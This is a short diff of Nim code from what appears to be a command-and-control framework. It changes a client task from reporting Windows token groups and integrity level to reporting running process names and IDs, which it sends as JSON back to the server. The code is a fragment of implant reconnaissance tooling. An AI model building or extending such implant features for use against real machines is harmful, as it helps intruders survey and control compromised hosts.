@@ -8,16 +8,13 @@ when defined(client):
 
 when defined(server):
   proc sendTask*(client: C2Client): Future[Task] {.async.} =
-    return await client.sendClientTask("tokinfo")
+    return await client.sendClientTask("processes")
 
 when defined(client):
-  proc executeTask*(socket: Socket, taskId: int, 
-    tokenGroups: seq[tuple[name, sid, domain: string]],
-    tokenIntegrity: string) =
+  proc executeTask*(socket: Socket, taskId: int, processes: seq[tuple[name: string, id: int]]) =
 
-    socket.sendOutput(taskId, "TOKENINFO", 
+    socket.sendOutput(taskId, "PROCESSES", 
       $(%*{
-        "tokenGroups": toJson tokenGroups,
-        "tokenIntegrity": tokenIntegrity
+        "processes": toJson processes
       })
     )
